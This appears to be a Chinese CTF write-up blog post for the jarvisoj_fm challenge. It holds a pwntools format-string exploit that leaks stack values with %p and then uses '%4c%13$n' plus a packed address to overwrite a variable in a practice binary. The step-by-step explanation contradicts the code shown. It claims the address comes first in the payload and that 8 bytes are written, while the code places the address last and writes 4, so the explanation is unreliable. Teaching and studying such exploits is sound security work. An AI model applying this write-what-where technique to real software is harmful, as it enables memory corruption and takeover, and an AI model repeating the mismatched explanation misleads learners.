+++
title = "jarvisoj_fm  wp and exp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
payload3 = b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'  
io.sendline(payload3)
```
看到0x41414141在11个

```python
from pwn import *

#start
r = process("../buu/jarvisoj_fm")

#params
x_addr = 0x804A02C

#attack
payload = b'%4c%13$n' + p32(x_addr)
print(payload)
r.sendline(payload)

r.interactive()

```

### 1. `p32(x_addr)`：指定“写入的目标”

- **含义**：`p32()` 是 `pwntools` 库中的一个函数，作用是将一个 32 位（4 字节）的整数打包成字节流（小端序）。
- **作用**：这里存放的是变量 `x` 在内存中的地址（例如 `0x0804A02C`）。
- **原理**：在利用格式化字符串漏洞时，我们需要告诉程序“把东西写到哪里去”。`p32(x_addr)` 就是把这个“目的地”放在了 payload 的最前面。

### 2. `b'%4c%13$n'`：定义“写入的动作”

这是一个特殊的格式化字符串，它由两部分组成：

- **`%4c`**：
    - `%c` 是打印字符的格式符。
    - `4` 是宽度修饰符。它的作用是：如果要打印的字符不足 4 个，就在前面补空格，凑够 4 个字符。
    - **目的**：它本身不打印有意义的字符，纯粹是为了**凑字节数**。加上前面的地址 `p32(x_addr)`（占 4 字节），此时 `printf` 总共已经“输出”了 8 个字节。
- **`%13$n`**：
    - `%n` 是 `printf` 中一个非常危险的格式符，它的作用不是打印，而是**将到目前为止 `printf` 已经输出的字符总数，写入到指定地址中**。
    - `13` 是位置参数（Positional parameter）。它告诉程序：“去栈上找第 13 个参数”。
    - **关键逻辑**：在漏洞触发时，我们精心构造的 `p32(x_addr)` 正好位于栈上的第 13 个位置。因此，`%13$n` 会去读取第 13 个参数的值（也就是 `x` 的地址），然后把当前的输出字节数（8）写入到这个地址中。
